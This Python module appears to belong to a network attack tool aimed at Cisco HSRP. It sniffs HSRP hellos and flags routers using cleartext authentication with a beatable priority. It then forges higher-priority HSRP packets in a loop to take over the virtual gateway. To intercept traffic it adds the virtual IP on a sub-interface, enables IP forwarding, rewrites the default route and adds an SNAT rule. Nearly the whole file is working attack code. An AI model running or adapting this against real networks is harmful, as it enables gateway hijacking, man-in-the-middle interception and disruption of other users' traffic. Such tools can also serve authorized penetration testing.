from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from scapy.layers.hsrp import *
from state import user_var
from state import vulnerable_hsrp_packets
from state import hsrp_config
import time
import subprocess
import signal

import sys
sys.path.append("..")
import utility 
import protocol_parser
import ipaddress
from protocols.hsrp_packet import HSRP_PACKET


def detect_if_vulnerable(packet):
    if (packet.haslayer('HSRP')):
        _, source_ip, _, destination_ip = protocol_parser.get_data_from_layer_two_and_three(packet)

        # HSRPv2 multicasts to a different IP
        if (destination_ip == '224.0.0.102'):
            bytes_packet = bytes_hex(packet[3])

            state = int(bytes_packet[4*2:(4*2)+1*2])
            priority = int(bytes_packet[14*2:(14*2)+4*2],16)
            group_state_length = int(bytes_packet[1*2:(1*2)+1*2],16)
            auth_type = int(bytes_packet[(group_state_length+2)*2:((group_state_length+2)*2)+1*2],16)

            # Auth type 3 means that its in the clear.
            if (auth_type == 3):
                if (state == 6):
                    if (priority < 255):
                        return True
                    elif (ipaddress.IPv4Address(utility.get_ip_address_from_interface(user_var.interface)) > ipaddress.IPv4Address(source_ip)):
                        return True
                    else:
                        return False 

        # HSRPv1                   
        else:
            if (packet.haslayer('HSRP MD5 Authentication')):
                # MD5 authentication detected, at current moment nothing we can do about attacking this.
                pass
            else:
                # A state with 16 means they are the master/active
                if(packet['HSRP'].state == 16):
                    if(packet['HSRP'].priority < 255):
                        #Detected a vulnerable condition, HSRP packets have a priority of less than 254, authentication is cleartext.
                        #Actually, if you find the priority to be 254/max, there is still a chance to attack this. You will need to obtain a high IP address.
                        #Refer to priority definition within https://tools.ietf.org/html/rfc2281#section-5.7.
                        return True

                        #Check if our IP address is higher, then we still have a chance if max priority is used.
                    elif (ipaddress.IPv4Address(utility.get_ip_address_from_interface(user_var.interface)) > ipaddress.IPv4Address(source_ip)):
                        return True
                    else:
                        return False
                else:
                    # recieved a packet belonging to standby router, we can ignore.
                    # FIXME look at improving the filter to only get active packets
                    pass
    else:
        return False

def get_packet_data(packet):
    _, source_ip, _, destination_ip = protocol_parser.get_data_from_layer_two_and_three(packet)

    # HSRPv2 multicasts to a different IP
    if (destination_ip == '224.0.0.102'):
        return get_packet_data_v2(packet)
    else:
        return get_packet_data_v1(packet)


def get_packet_data_v1(packet):
    source_mac, source_ip, destination_mac, destination_ip = protocol_parser.get_data_from_layer_two_and_three(packet)

    state = packet['HSRP'].state
    hello_interval = packet['HSRP'].hellotime
    dead_internal = packet['HSRP'].holdtime
    priority = packet['HSRP'].priority
    group = packet['HSRP'].group

    #add logic to check what authentication type is used?
    authentication = packet['HSRP'].auth.decode().rstrip('\x00')
    virtual_ip = packet['HSRP'].virtualIP

    return source_mac, source_ip, destination_mac, destination_ip, 1, state, hello_interval, dead_internal, priority, group, authentication, None, virtual_ip

def get_packet_data_v2(packet):
    source_mac, source_ip, destination_mac, destination_ip = protocol_parser.get_data_from_layer_two_and_three(packet)

    #based off http://www.smartnetworks.jp/2006/02/hsrp_8_hsrp_version_2.html found through https://samate.nist.gov/SRD/testcases/SATE/wireshark-1.8.0/epan/dissectors/packet-hsrp.c

    bytes_packet = bytes_hex(packet[3])

    group_state_length = int(bytes_packet[1*2:(1*2)+1*2],16)

    version = int(bytes_packet[2*2:(2*2)+1*2])
    state = int(bytes_packet[4*2:(4*2)+1*2])
    group = int(bytes_packet[6*2:(6*2)+2*2],16)
    identifier = str(bytes_packet[8*2:(8*2)+6*2], 'utf-8')
    priority = int(bytes_packet[14*2:(14*2)+4*2],16)
    hello_interval = int(bytes_packet[18*2:(18*2)+4*2],16)
    dead_interval = int(bytes_packet[22*2:(22*2)+4*2],16)
    virtual_ip = socket.inet_ntoa(struct.pack(">L", int(bytes_packet[26*2:(26*2)+4*2], 16)))

    auth_type = int(bytes_packet[(group_state_length+2)*2:((group_state_length+2)*2)+1*2],16)
    auth_length = None
    auth_data = None

    if auth_type == 3:
        auth_length = int(bytes_packet[(group_state_length+3)*2:((group_state_length+3)*2)+1*2],16)
        auth_data = bytes_packet[(group_state_length+4)*2:((group_state_length+4)*2)+auth_length*2]
        auth_data = bytearray.fromhex(auth_data.decode('UTF-8')).decode()
        auth_data = auth_data.rstrip('\x00')

    return source_mac, source_ip, destination_mac, destination_ip, 2, state, hello_interval, dead_interval, priority, group, auth_data, identifier, virtual_ip

def check_if_same(packet1, packet2):
    if packet1.source_ip == packet2.source_ip and packet1.group == packet2.group and packet1.authentication == packet2.authentication:
        return True
    else:
        return False

def hsrp_scan_start(packet):

    def detect_network_protocol(packet):
        if packet.haslayer('HSRP'):
            if detect_if_vulnerable(packet):
                new_vulnerable_hsrp_packet = HSRP_PACKET()
                new_vulnerable_hsrp_packet.set_data(*get_packet_data(packet), True)
                exists = False

                for vulnerable_hsrp_packet in vulnerable_hsrp_packets:
                    if (check_if_same(new_vulnerable_hsrp_packet, vulnerable_hsrp_packet)):
                        exists = True
                
                if (not exists):
                    vulnerable_hsrp_packets.append(new_vulnerable_hsrp_packet)

    detect_network_protocol(packet)

def payload_hsrp_packet_v1(hsrp_packet):
    payload_packet = Ether(dst=hsrp_packet.destination_mac)
    payload_packet = payload_packet / IP(src=utility.get_ip_address_from_interface(user_var.interface), dst=hsrp_packet.destination_ip, ttl=1)
    payload_packet = payload_packet / UDP(sport=1985, dport=1985)

    priority = hsrp_packet.priority

    if (hsrp_packet.priority == 255):
        pass
    else:
        priority = priority + 1

    payload_packet = payload_packet / HSRP(hellotime=hsrp_packet.hello_interval, holdtime=hsrp_packet.dead_interval, priority=priority, group=hsrp_packet.group, virtualIP=hsrp_packet.virtual_ip, auth=hsrp_packet.authentication)
    
    return payload_packet

def payload_hsrp_packet_v2(hsrp_packet):
    payload_packet = Ether(dst=hsrp_packet.destination_mac)
    payload_packet = payload_packet / IP(src=utility.get_ip_address_from_interface(user_var.interface), dst=hsrp_packet.destination_ip, ttl=1)
    payload_packet = payload_packet / UDP(sport=1985, dport=1985)

    priority = hsrp_packet.priority

    if (hsrp_packet.priority == 255):
        pass
    else:
        priority = priority + 1

    #Padded with 12 null bytes for IPv4.
    payload_packet = payload_packet / (struct.pack('B', 1)+struct.pack('B', 40)+struct.pack('B', hsrp_packet.version)+struct.pack('B', 0)+struct.pack('B', hsrp_packet.state)+struct.pack('B', 4)+struct.pack('>H', hsrp_packet.group)+bytearray.fromhex(hsrp_packet.identifier)+struct.pack('>I', priority)+struct.pack('>I', hsrp_packet.hello_interval)+struct.pack('>I', hsrp_packet.dead_interval)+struct.pack('>L', int(ipaddress.IPv4Address(hsrp_packet.virtual_ip)))+(struct.pack('B', 0)*12)+struct.pack('B', 3)+struct.pack('B', 8)+bytearray.fromhex(hsrp_packet.authentication.encode("utf-8").hex())+(struct.pack('B', 0)*(8-len(hsrp_packet.authentication))))
    
    return payload_packet

def send_hsrp_packet(hsrp_packet,count):
    payload_packet = None
    if (hsrp_packet.version == 1):
        payload_packet = payload_hsrp_packet_v1(hsrp_packet)
    else:
        payload_packet = payload_hsrp_packet_v2(hsrp_packet)

    prepare_environment(hsrp_packet)

    interval = 0

    if (hsrp_packet.hello_interval > 1000):
        interval = hsrp_packet.hello_interval / 1000
    else:
        interval = hsrp_packet.hello_interval

    # look into why it won't immediately stop.
    if (count == 1):
        sendp(payload_packet, iface=user_var.interface, loop=1, verbose=0, inter=interval)
    else:
        sendp(payload_packet, iface=user_var.interface, count=count, verbose=0, inter=interval)
    
    clean_up()

def prepare_environment(hsrp_packet):

    netmask = utility.get_interface_netmask(user_var.interface)
    
    print('Preparing environment - Adding sub interface 99 to {}'.format(user_var.interface))
    subprocess.Popen(['ifconfig {}:99 {} netmask {} up'.format(user_var.interface,hsrp_packet.virtual_ip, netmask)], stdout=subprocess.PIPE,
                        shell=True)

    if not hsrp_config.ipv4_forward_enabled:
        print('Preparing environment - Enabling IP forwarding')
        subprocess.Popen(['sysctl -w net.ipv4.ip_forward=1'], stdout=subprocess.PIPE, shell=True)

    if not utility.get_default_gateway() == hsrp_packet.virtual_ip:
        # Our gateway isn't the same and results may not be the same.
        print('Found that the default gateway set is not the same as the virtual IP in the HSRP configuration')
        hsrp_config.set_default_gateway(utility.get_default_gateway())

    else:
        hsrp_config.set_default_gateway(hsrp_packet.virtual_ip)

    # FIXME gateways without a netmask of 0? See if we can extract full info? Right now hard coded

    print('Preparing environment - Changing the default gateway from {} to {}'.format(utility.get_default_gateway(), hsrp_packet.source_ip))

    utility.edit_specific_route('0.0.0.0', utility.get_default_gateway(), '0.0.0.0', 'del')
    utility.edit_specific_route('0.0.0.0', hsrp_packet.source_ip, '0.0.0.0', 'add') 

    # We need to source NAT it in some way
    print('Preparing environment - Adding iptable rule to do source NAT on interface {}'.format(user_var.interface))
    utility.iptablesSNAT('insert', user_var)


def clean_up():
    # FIXME look into cleaning up the other interface
    # FIXME look into this one
    subprocess.Popen(['sudo ip -s -s neigh flush all'], stdout=subprocess.PIPE, shell=True)

    if not hsrp_config.ipv4_forward_enabled:
        print('Cleaning up environment - Disabling IP forwarding')
        subprocess.Popen(['sysctl net.ipv4.ip_forward=0'], stdout=subprocess.PIPE, shell=True)

    # Revert gateway changes

    print('Cleaning up environment - Changing the default gateway back to {}'.format(hsrp_config.default_gateway))

    utility.edit_specific_route('0.0.0.0', utility.get_default_gateway(), '0.0.0.0', 'del')
    utility.edit_specific_route('0.0.0.0', hsrp_config.default_gateway, '0.0.0.0', 'add')  

    print('Cleaning up environment - Removing iptable rule to do source NAT on interface {}'.format(user_var.interface))
    utility.iptablesSNAT('remove', user_var)

    print('Cleaning up environment - Removing created interface')
    subprocess.Popen(['ifconfig {}:99 down'.format(user_var.interface)], stdout=subprocess.PIPE, shell=True)

def keyboard_interrupt_handler(signal, frame):
    print("Interrupt recieved. Cleaning up...".format(signal))
    clean_up()
    exit(0)

def hsrp_attack_start(count):

    proc = subprocess.Popen(['sysctl net.ipv4.ip_forward'],shell=True,stdout=subprocess.PIPE)
    enable_ipv4_forwarding = str(proc.stdout.read()).split('=')[1]

    if '1' in enable_ipv4_forwarding:
        hsrp_config.set_ipv4_forward_enabled(True)

    signal.signal(signal.SIGINT, keyboard_interrupt_handler)
    
    for v_packet in vulnerable_hsrp_packets:
        if (v_packet.source_ip == user_var.target):
            send_hsrp_packet(v_packet,count)
